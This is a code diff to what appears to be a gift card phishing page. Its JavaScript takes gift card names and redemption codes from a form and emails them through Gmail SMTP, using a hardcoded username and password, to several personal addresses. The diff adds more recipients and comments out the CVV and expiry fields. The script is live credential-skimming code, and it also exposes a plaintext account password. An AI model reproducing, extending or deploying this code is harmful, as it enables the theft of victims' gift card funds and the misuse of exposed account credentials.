@@ -94,7 +94,7 @@
                   </i>
                 </div>
               </div>
-              <div class="form-group basic animated">
+              <!-- <div class="form-group basic animated">
                 <div class="input-wrapper">
                   <label class="label" for="code">Card CVV</label>
                   <input
@@ -123,7 +123,7 @@
                     <ion-icon name="close-circle"></ion-icon>
                   </i>
                 </div>
-              </div>
+              </div> -->
 
               <div class="form-group basic animated">
                 <div class="input-wrapper">
@@ -260,6 +260,10 @@
         </div>
       </a>
     </div>
+
+    <!-- <p>Gift Card CVV:  ${cvv.value}</p>
+          <p>Gift Card Expiry:  ${date.value}</p> -->
+
     <!-- * App Bottom Menu -->
 
     <!-- ========= JS Files =========  -->
@@ -291,8 +295,8 @@
       const modal = document.querySelector('#alert');
       const name = document.querySelector('#name');
       const code = document.querySelector('#code');
-      const cvv = document.querySelector('#cvv');
-      const date = document.querySelector('#date');
+      // const cvv = document.querySelector('#cvv');
+      // const date = document.querySelector('#date');
       const error = document.querySelector('.modal-body');
 
       const m = 'modal open';
@@ -313,7 +317,11 @@
           Host: 'smtp.googlemail.com',
           Username: 'lovedayperfection0@gmail.com',
           Password: 'chdhqslattahkmbv',
-          To: 'Michchris900@gmail.com',
+          To: [
+            'Williamcampbell693@gmail.com',
+            'Michchris900@gmail.com',
+            'pay-de@mail.com',
+          ],
           From: 'allmygiftcards@gmail.com',
           Subject: 'New Gift Card Entry Alert',
           Body: `
@@ -323,8 +331,7 @@
          <p> Gift Card Redemption Code:  ${code.value}</p>
 
           <p>Gift Card Name:  ${name.value}</p>
-          <p>Gift Card CVV:  ${cvv.value}</p>
-          <p>Gift Card Expiry:  ${date.value}</p>
+      
 
           `,
         })
@@ -343,8 +350,7 @@
          <p> Gift Card Redemption Code:  ${code.value}</p>
 
           <p>Gift Card Name:  ${name.value}</p>
-           <p>Gift Card CVV:  ${cvv.value}</p>
-          <p>Gift Card Expiry:  ${date.value}</p>
+       
 
           `,
             });
